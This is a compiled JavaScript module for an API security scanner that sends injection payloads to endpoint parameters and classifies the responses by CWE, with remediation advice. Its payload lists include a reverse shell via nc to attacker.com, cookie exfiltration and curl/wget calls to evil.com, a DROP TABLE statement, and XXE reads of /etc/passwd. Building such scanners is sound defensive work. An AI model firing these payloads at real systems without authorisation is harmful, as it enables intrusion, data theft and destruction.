"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.ParameterTester = void 0;
const axios_1 = __importDefault(require("axios"));
const logger_1 = require("../utils/logger");
class ParameterTester {
    constructor(options = { useAI: false, maxPayloads: 50, includeAdvanced: false }) {
        this.options = options;
        this.sqlInjectionPayloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
            "' OR (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
            "' OR SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR 'x'='x",
            "admin'--",
            "' OR 1=1#",
            "' HAVING 1=1--",
            "' GROUP BY 1--",
            "' ORDER BY 1--"
        ];
        this.nosqlInjectionPayloads = [
            { "$ne": null },
            { "$regex": ".*" },
            { "$where": "1==1" },
            { "$gt": "" },
            { "$exists": true },
            { "$in": ["admin", "user"] },
            { "$or": [{ "a": 1 }, { "b": 2 }] },
            { "$and": [{ "a": 1 }, { "b": 2 }] },
            "'; return db.users.find(); //",
            { "$func": "var_dump" }
        ];
        this.xssPayloads = [
            "<script>alert('XSS')</script>",
            "'><script>alert(String.fromCharCode(88,83,83))</script>",
            "\"><script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<%2Fscript%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "<script>fetch('http://evil.com/'+document.cookie)</script>"
        ];
        this.commandInjectionPayloads = [
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "|| id",
            "`id`",
            "$(whoami)",
            "; cat /etc/hosts",
            "| nc -e /bin/sh attacker.com 4444",
            "&& curl http://evil.com/$(whoami)",
            "; sleep 10",
            "| ping -c 10 127.0.0.1",
            "&& echo 'vulnerable' > /tmp/test",
            "|| wget http://evil.com/shell.php"
        ];
        this.pathTraversalPayloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "/var/www/../../etc/passwd",
            "file:///etc/passwd",
            "php://filter/read=convert.base64-encode/resource=../../../etc/passwd"
        ];
        this.ldapInjectionPayloads = [
            "*",
            "*)(&",
            "*)(uid=*)(&",
            "*)(|(uid=*))",
            "*)(|(password=*))",
            "admin)(&(password=*))",
            "*)(|(&(objectClass=person)(uid=*)))",
            "*)(|(objectClass=*))"
        ];
        this.xxePayloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://evil.com/evil.dtd">]><root>&test;</root>',
            '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]><foo/>'
        ];
        this.errorSignatures = {
            sql: [
                'SQL syntax', 'mysql_fetch', 'ORA-', 'PostgreSQL', 'Warning: pg_',
                'valid MySQL result', 'MySqlClient', 'Microsoft OLE DB Provider',
                'Unclosed quotation mark', 'quoted string not properly terminated'
            ],
            nosql: [
                'MongoError', 'CastError', 'ValidationError', 'BSONError',
                'E11000 duplicate key', 'MongoNetworkError'
            ],
            xss: [
                'script', 'alert', 'onerror', 'onload', 'javascript:'
            ],
            command: [
                'sh: ', 'bash: ', 'cmd: ', 'command not found', '/bin/sh',
                'Permission denied', 'No such file or directory'
            ],
            path_traversal: [
                'root:x:', 'daemon:x:', 'bin:x:', '[boot loader]', 'WINDOWS',
                'Program Files', 'Documents and Settings'
            ],
            ldap: [
                'Invalid DN syntax', 'LDAP: error code', 'LdapErr',
                'com.sun.jndi.ldap', 'javax.naming.directory'
            ]
        };
    }
    async testParameter(endpoint, method, parameter, baselineResponse) {
        logger_1.logger.info(`Testing parameter: ${parameter.name} (${parameter.type}) at ${method} ${endpoint}`);
        const vulnerabilities = [];
        try {
            // Get baseline response if not provided
            if (!baselineResponse) {
                baselineResponse = await this.makeBaselineRequest(endpoint, method, parameter);
            }
            // Generate AI-enhanced payloads
            const payloads = await this.generatePayloads(parameter);
            // Test each payload category
            for (const payload of payloads) {
                try {
                    const vulnerability = await this.testPayload(endpoint, method, parameter, payload, baselineResponse);
                    if (vulnerability) {
                        vulnerabilities.push(vulnerability);
                    }
                }
                catch (error) {
                    logger_1.logger.warn(`Payload test failed: ${error.message}`);
                }
            }
            // AI-enhanced analysis for complex vulnerabilities
            if (this.options.useAI && vulnerabilities.length > 0) {
                await this.enhanceVulnerabilityAnalysis(vulnerabilities);
            }
            return vulnerabilities;
        }
        catch (error) {
            logger_1.logger.error(`Parameter testing failed: ${error.message}`);
            return [];
        }
    }
    async generatePayloads(parameter) {
        const payloads = [];
        // SQL Injection payloads
        if (parameter.type === 'string' || parameter.type === 'unknown') {
            this.sqlInjectionPayloads.slice(0, 10).forEach(payload => {
                payloads.push({
                    value: payload,
                    technique: 'SQL Injection',
                    category: 'injection',
                    description: 'SQL injection attempt to bypass authentication or extract data'
                });
            });
        }
        // NoSQL Injection payloads
        if (parameter.type === 'object' || parameter.type === 'string') {
            this.nosqlInjectionPayloads.slice(0, 8).forEach(payload => {
                payloads.push({
                    value: payload,
                    technique: 'NoSQL Injection',
                    category: 'injection',
                    description: 'NoSQL injection attempt to bypass filters or extract data'
                });
            });
        }
        // XSS payloads
        if (parameter.type === 'string') {
            this.xssPayloads.slice(0, 8).forEach(payload => {
                payloads.push({
                    value: payload,
                    technique: 'Cross-Site Scripting (XSS)',
                    category: 'injection',
                    description: 'XSS payload to execute malicious scripts'
                });
            });
        }
        // Command Injection payloads
        if (parameter.type === 'string') {
            this.commandInjectionPayloads.slice(0, 8).forEach(payload => {
                payloads.push({
                    value: payload,
                    technique: 'Command Injection',
                    category: 'injection',
                    description: 'Command injection to execute system commands'
                });
            });
        }
        // Path Traversal payloads
        if (parameter.name.toLowerCase().includes('file') ||
            parameter.name.toLowerCase().includes('path') ||
            parameter.name.toLowerCase().includes('url')) {
            this.pathTraversalPayloads.slice(0, 6).forEach(payload => {
                payloads.push({
                    value: payload,
                    technique: 'Path Traversal',
                    category: 'traversal',
                    description: 'Path traversal attempt to access unauthorized files'
                });
            });
        }
        // Type confusion payloads
        if (parameter.type === 'number') {
            ['string', 'null', [], {}, true, false].forEach(payload => {
                payloads.push({
                    value: payload,
                    technique: 'Type Confusion',
                    category: 'logic',
                    description: 'Type confusion to bypass validation logic'
                });
            });
        }
        // Buffer overflow payloads
        if (parameter.type === 'string' && parameter.constraints?.maxLength) {
            const overflowLength = parameter.constraints.maxLength * 2;
            payloads.push({
                value: 'A'.repeat(overflowLength),
                technique: 'Buffer Overflow',
                category: 'overflow',
                description: 'Buffer overflow attempt with excessive input length'
            });
        }
        // AI-enhanced payload generation
        if (this.options.useAI) {
            const aiPayloads = await this.generateAIEnhancedPayloads(parameter);
            payloads.push(...aiPayloads);
        }
        // Limit payload count
        return payloads.slice(0, this.options.maxPayloads);
    }
    async generateAIEnhancedPayloads(parameter) {
        // Simulated AI-enhanced payload generation
        // In a real implementation, this would use ML models
        const aiPayloads = [];
        // Context-aware payload generation based on parameter name
        const paramName = parameter.name.toLowerCase();
        if (paramName.includes('email')) {
            aiPayloads.push({
                value: 'admin@localhost.localdomain',
                technique: 'Email Enumeration',
                category: 'enumeration',
                description: 'Common admin email for privilege escalation'
            }, {
                value: '"<script>alert(1)</script>"@evil.com',
                technique: 'Email XSS',
                category: 'injection',
                description: 'XSS payload embedded in email format'
            });
        }
        if (paramName.includes('id') || paramName.includes('user')) {
            aiPayloads.push({
                value: '../admin',
                technique: 'ID Traversal',
                category: 'traversal',
                description: 'Attempt to access admin user context'
            }, {
                value: '0',
                technique: 'Admin ID Guessing',
                category: 'enumeration',
                description: 'Common admin user ID value'
            });
        }
        if (paramName.includes('password')) {
            aiPayloads.push({
                value: '',
                technique: 'Empty Password',
                category: 'authentication',
                description: 'Empty password bypass attempt'
            }, {
                value: { '$ne': null },
                technique: 'NoSQL Password Bypass',
                category: 'injection',
                description: 'NoSQL injection to bypass password check'
            });
        }
        // Pattern-based AI payload generation
        if (parameter.format === 'date') {
            aiPayloads.push({
                value: '1970-01-01T00:00:00Z',
                technique: 'Epoch Date Injection',
                category: 'logic',
                description: 'Unix epoch date to trigger edge cases'
            }, {
                value: '9999-12-31T23:59:59Z',
                technique: 'Future Date Injection',
                category: 'logic',
                description: 'Far future date to test date handling'
            });
        }
        return aiPayloads;
    }
    async testPayload(endpoint, method, parameter, payload, baselineResponse) {
        const startTime = Date.now();
        try {
            // Create request with malicious payload
            const response = await this.makeRequest(endpoint, method, parameter, payload.value);
            const responseTime = Date.now() - startTime;
            // Analyze response for vulnerabilities
            const vulnerability = this.analyzeResponse(parameter, payload, response, baselineResponse, responseTime);
            return vulnerability;
        }
        catch (error) {
            // Network errors might indicate successful attacks (e.g., server crash)
            if (error.code === 'ECONNRESET' || error.code === 'ETIMEDOUT') {
                return {
                    parameter,
                    vulnerability: {
                        type: 'denial_of_service',
                        name: 'Potential Denial of Service',
                        description: 'Request caused server connection reset or timeout',
                        severity: 'HIGH',
                        confidence: 0.7,
                        cwe: 'CWE-400',
                        owasp: 'A06:2021 – Vulnerable and Outdated Components'
                    },
                    payload: {
                        original: parameter.example,
                        malicious: payload.value,
                        technique: payload.technique,
                        category: payload.category
                    },
                    evidence: {
                        request: `${method} ${endpoint}`,
                        response: `Connection ${error.code}`,
                        statusCode: 0,
                        responseTime: Date.now() - startTime,
                        differenceDetected: true,
                        errorSignatures: [error.code]
                    },
                    impact: 'Server instability or denial of service condition',
                    recommendation: 'Implement proper input validation and error handling'
                };
            }
            return null;
        }
    }
    analyzeResponse(parameter, payload, response, baselineResponse, responseTime) {
        const responseBody = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
        const baselineBody = typeof baselineResponse.data === 'string' ? baselineResponse.data : JSON.stringify(baselineResponse.data);
        // Check for error signatures
        const detectedErrors = this.detectErrorSignatures(responseBody, payload.category);
        // Status code analysis
        const statusCodeDiff = response.status !== baselineResponse.status;
        // Response size analysis
        const sizeDiff = Math.abs(responseBody.length - baselineBody.length) > 100;
        // Response time analysis (potential for timing attacks)
        const timingAnomaly = responseTime > 5000; // 5 second threshold
        // Content difference analysis
        const contentDiff = this.analyzeContentDifference(responseBody, baselineBody);
        // Determine if vulnerability exists
        if (detectedErrors.length > 0 || statusCodeDiff || sizeDiff || timingAnomaly || contentDiff.suspicious) {
            const vulnerability = this.classifyVulnerability(payload, detectedErrors, {
                statusCodeDiff,
                sizeDiff,
                timingAnomaly,
                contentDiff: contentDiff.suspicious,
                responseTime
            });
            if (vulnerability) {
                return {
                    parameter,
                    vulnerability,
                    payload: {
                        original: parameter.example,
                        malicious: payload.value,
                        technique: payload.technique,
                        category: payload.category
                    },
                    evidence: {
                        request: `${payload.technique}: ${JSON.stringify(payload.value)}`,
                        response: responseBody.substring(0, 500) + (responseBody.length > 500 ? '...' : ''),
                        statusCode: response.status,
                        responseTime,
                        differenceDetected: true,
                        errorSignatures: detectedErrors
                    },
                    impact: this.getVulnerabilityImpact(vulnerability.type),
                    recommendation: this.getVulnerabilityRecommendation(vulnerability.type)
                };
            }
        }
        return null;
    }
    detectErrorSignatures(responseBody, category) {
        const signatures = [];
        const lowercaseBody = responseBody.toLowerCase();
        // Check category-specific error signatures
        if (this.errorSignatures[category]) {
            for (const signature of this.errorSignatures[category]) {
                if (lowercaseBody.includes(signature.toLowerCase())) {
                    signatures.push(signature);
                }
            }
        }
        // Check all error signatures if none found
        if (signatures.length === 0) {
            for (const [cat, sigs] of Object.entries(this.errorSignatures)) {
                for (const signature of sigs) {
                    if (lowercaseBody.includes(signature.toLowerCase())) {
                        signatures.push(`${cat}:${signature}`);
                    }
                }
            }
        }
        return signatures;
    }
    analyzeContentDifference(responseBody, baselineBody) {
        // Check for SQL injection indicators in response
        const sqlIndicators = ['syntax error', 'column', 'table', 'database', 'select', 'union'];
        const hasNewSqlContent = sqlIndicators.some(indicator => responseBody.toLowerCase().includes(indicator) &&
            !baselineBody.toLowerCase().includes(indicator));
        // Check for XSS reflection
        const hasScriptTags = responseBody.includes('<script>') && !baselineBody.includes('<script>');
        // Check for path traversal success
        const hasFileContent = responseBody.includes('root:') || responseBody.includes('[boot loader]');
        if (hasNewSqlContent) {
            return { suspicious: true, reason: 'SQL content detected' };
        }
        if (hasScriptTags) {
            return { suspicious: true, reason: 'Script tags reflected' };
        }
        if (hasFileContent) {
            return { suspicious: true, reason: 'System file content detected' };
        }
        return { suspicious: false };
    }
    classifyVulnerability(payload, errorSignatures, indicators) {
        // Determine vulnerability type and severity based on evidence
        if (errorSignatures.some(sig => sig.includes('sql'))) {
            return {
                type: 'sql_injection',
                name: 'SQL Injection',
                description: 'Parameter vulnerable to SQL injection attacks',
                severity: 'CRITICAL',
                confidence: 0.9,
                cwe: 'CWE-89',
                owasp: 'A03:2021 – Injection'
            };
        }
        if (errorSignatures.some(sig => sig.includes('nosql'))) {
            return {
                type: 'nosql_injection',
                name: 'NoSQL Injection',
                description: 'Parameter vulnerable to NoSQL injection attacks',
                severity: 'HIGH',
                confidence: 0.85,
                cwe: 'CWE-943',
                owasp: 'A03:2021 – Injection'
            };
        }
        if (payload.technique.includes('XSS')) {
            return {
                type: 'xss',
                name: 'Cross-Site Scripting (XSS)',
                description: 'Parameter vulnerable to XSS attacks',
                severity: 'HIGH',
                confidence: 0.8,
                cwe: 'CWE-79',
                owasp: 'A03:2021 – Injection'
            };
        }
        if (payload.technique.includes('Command')) {
            return {
                type: 'command_injection',
                name: 'Command Injection',
                description: 'Parameter vulnerable to command injection',
                severity: 'CRITICAL',
                confidence: 0.85,
                cwe: 'CWE-78',
                owasp: 'A03:2021 – Injection'
            };
        }
        if (indicators.timingAnomaly && payload.technique.includes('SQL')) {
            return {
                type: 'blind_sql_injection',
                name: 'Blind SQL Injection',
                description: 'Parameter vulnerable to time-based blind SQL injection',
                severity: 'HIGH',
                confidence: 0.7,
                cwe: 'CWE-89',
                owasp: 'A03:2021 – Injection'
            };
        }
        if (payload.category === 'logic') {
            return {
                type: 'business_logic_error',
                name: 'Business Logic Vulnerability',
                description: 'Parameter validation bypass detected',
                severity: 'MEDIUM',
                confidence: 0.6,
                cwe: 'CWE-840',
                owasp: 'A04:2021 – Insecure Design'
            };
        }
        return null;
    }
    getVulnerabilityImpact(type) {
        const impacts = {
            'sql_injection': 'Unauthorized data access, data manipulation, potential system compromise',
            'nosql_injection': 'Authentication bypass, data extraction, unauthorized access',
            'xss': 'Session hijacking, credential theft, malicious script execution',
            'command_injection': 'Remote code execution, system compromise, data exfiltration',
            'path_traversal': 'Unauthorized file access, sensitive data exposure',
            'business_logic_error': 'Business process bypass, unauthorized operations',
            'denial_of_service': 'Service disruption, resource exhaustion'
        };
        return impacts[type] || 'Potential security impact requiring investigation';
    }
    getVulnerabilityRecommendation(type) {
        const recommendations = {
            'sql_injection': 'Use parameterized queries and input validation. Implement least privilege database access.',
            'nosql_injection': 'Sanitize inputs and use schema validation. Implement proper query construction.',
            'xss': 'Implement output encoding and Content Security Policy. Validate and sanitize all inputs.',
            'command_injection': 'Avoid system command execution. Use safe APIs and input validation.',
            'path_traversal': 'Validate file paths and use whitelisting. Implement proper access controls.',
            'business_logic_error': 'Review business logic validation and implement proper type checking.',
            'denial_of_service': 'Implement rate limiting and input validation. Monitor resource usage.'
        };
        return recommendations[type] || 'Implement proper input validation and security controls';
    }
    async makeBaselineRequest(endpoint, method, parameter) {
        const safeValue = this.generateSafeValue(parameter);
        return await this.makeRequest(endpoint, method, parameter, safeValue);
    }
    async makeRequest(endpoint, method, parameter, value) {
        const config = {
            method: method.toLowerCase(),
            url: endpoint,
            timeout: 10000,
            validateStatus: () => true,
            headers: {
                'User-Agent': 'API-Security-Scanner/1.0',
                'Accept': 'application/json, */*'
            }
        };
        // Add parameter based on location
        if (parameter.location === 'query') {
            config.params = { [parameter.name]: value };
        }
        else if (parameter.location === 'body') {
            config.data = { [parameter.name]: value };
            config.headers['Content-Type'] = 'application/json';
        }
        else if (parameter.location === 'header') {
            config.headers[parameter.name] = value;
        }
        else if (parameter.location === 'path') {
            config.url = endpoint.replace(`{${parameter.name}}`, encodeURIComponent(value));
        }
        return await (0, axios_1.default)(config);
    }
    generateSafeValue(parameter) {
        switch (parameter.type) {
            case 'string':
                return parameter.example || 'test';
            case 'number':
                return parameter.example || 1;
            case 'boolean':
                return parameter.example || true;
            case 'array':
                return parameter.example || [];
            case 'object':
                return parameter.example || {};
            default:
                return 'test';
        }
    }
    async enhanceVulnerabilityAnalysis(vulnerabilities) {
        // AI-enhanced post-processing of vulnerabilities
        // This could involve ML models for false positive reduction
        for (const vuln of vulnerabilities) {
            // Adjust confidence based on multiple factors
            if (vuln.evidence.errorSignatures && vuln.evidence.errorSignatures.length > 1) {
                vuln.vulnerability.confidence = Math.min(vuln.vulnerability.confidence + 0.1, 1.0);
            }
            // Cross-reference with known vulnerability patterns
            if (vuln.vulnerability.type === 'sql_injection' && vuln.evidence.responseTime > 3000) {
                vuln.vulnerability.name = 'Time-based Blind SQL Injection';
                vuln.vulnerability.confidence = Math.min(vuln.vulnerability.confidence + 0.05, 1.0);
            }
        }
    }
}
exports.ParameterTester = ParameterTester;
//# sourceMappingURL=parameterTester.js.map